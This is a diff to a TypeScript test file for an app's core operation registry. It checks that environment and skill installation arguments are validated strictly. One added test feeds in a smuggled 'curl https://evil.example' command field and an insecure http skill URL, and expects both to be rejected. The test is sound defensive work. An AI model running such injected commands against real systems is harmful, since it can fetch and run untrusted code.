@@ -15,7 +15,7 @@ describe('Core operation registry', () => {
   it('covers every public CoreApi route exactly once', () => {
     const routeKeys = CORE_API_ROUTE_OPERATIONS.map((entry) => entry.key).sort()
 
-    expect(coreOperationKeys()).toHaveLength(84)
+    expect(coreOperationKeys()).toHaveLength(90)
     expect(coreOperationKeys()).toEqual(routeKeys)
     expect(Object.keys(CORE_OPERATION_REGISTRY).sort()).toEqual(routeKeys)
   })
@@ -79,6 +79,59 @@ describe('Core operation registry', () => {
         { name: 'valid', output: '/tmp/untrusted' },
       ]),
     ).toThrow()
+    expect(() =>
+      CORE_OPERATION_REGISTRY['environment.install'].args.parse([
+        {
+          planId: 'plan_1',
+          acceptedLicenseIds: [],
+          confirmedStepIds: [],
+          command: 'curl https://evil.example',
+        },
+      ]),
+    ).toThrow()
+    expect(() =>
+      CORE_OPERATION_REGISTRY['skills.previewInstall'].args.parse([
+        { source: { kind: 'url', url: 'http://insecure.example/a.zip' } },
+      ]),
+    ).toThrow()
+  })
+
+  it('defines exact Environment and Skill installation tuples', () => {
+    expect(
+      CORE_OPERATION_REGISTRY['environment.getStatus'].args.parse([]),
+    ).toEqual([])
+    expect(
+      CORE_OPERATION_REGISTRY['environment.getStatus'].args.parse([
+        { forceRefresh: true },
+      ]),
+    ).toEqual([{ forceRefresh: true }])
+    expect(
+      CORE_OPERATION_REGISTRY['environment.getInstallLog'].args.parse([
+        { jobId: 'job_1', cursor: 0, limit: 50 },
+      ]),
+    ).toEqual([{ jobId: 'job_1', cursor: 0, limit: 50 }])
+    expect(
+      CORE_OPERATION_REGISTRY['skills.previewInstall'].args.parse([
+        { source: { kind: 'local', path: '/tmp/skill.zip' } },
+      ]),
+    ).toEqual([{ source: { kind: 'local', path: '/tmp/skill.zip' } }])
+    expect(
+      CORE_OPERATION_REGISTRY['skills.confirmInstall'].args.parse([
+        {
+          previewId: `preview_${'a'.repeat(24)}`,
+          digest: 'b'.repeat(64),
+          candidateId: `candidate_${'c'.repeat(20)}`,
+          permissionConfirmed: true,
+        },
+      ]),
+    ).toEqual([
+      {
+        previewId: `preview_${'a'.repeat(24)}`,
+        digest: 'b'.repeat(64),
+        candidateId: `candidate_${'c'.repeat(20)}`,
+        permissionConfirmed: true,
+      },
+    ])
   })
 
   it('preserves forward-compatible MCP fields while validating known fields', () => {
